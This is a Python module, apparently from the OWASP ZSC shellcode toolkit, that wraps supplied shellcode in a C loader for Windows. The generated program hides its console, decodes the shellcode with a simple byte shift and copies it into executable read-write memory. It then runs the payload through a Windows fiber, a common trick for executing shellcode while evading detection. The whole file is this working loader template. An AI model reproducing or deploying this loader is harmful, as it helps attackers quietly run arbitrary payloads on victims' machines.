from owasp_zsc.new_cores import base_module


class ObfuscateModule(base_module.BaseModule):
    # times = base_module.OptInt(1, "how many times obfuscate runs")
    def encode(self, data):
        requires_import = ["#include <windows.h>"]
        shellcode = ""
        head = ""

        for line in data.split("\n"):
            if line.strip().startswith("#include"):
                import_header = line.strip()
                if import_header not in head:
                    head += import_header + "\n"
            elif "char *shellcode " in line or "char shellcode[]" in line:
                shellcode = line + "\n"

        for import_line in requires_import:
            if import_line not in head:
                head += import_line + "\n"

        head += "int main() {\n"
        head += "FreeConsole();\n"
        head += "PVOID mainFiber = ConvertThreadToFiber(NULL);\n"
        tail = "for (int i = 0; i < sizeof shellcode; i++)\n"
        tail += " shellcode[i] = shellcode[i] - 7;\n"
        tail += "PVOID shellcodeLocation = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
        tail += "memcpy(shellcodeLocation, shellcode, sizeof shellcode);\n"
        tail += "PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL);\n"
        tail += "SwitchToFiber(shellcodeFiber);\n"
        tail += "return 0;\n}\n"

        return head + shellcode + tail

    def start(self, content):
        return str(self.encode(content))
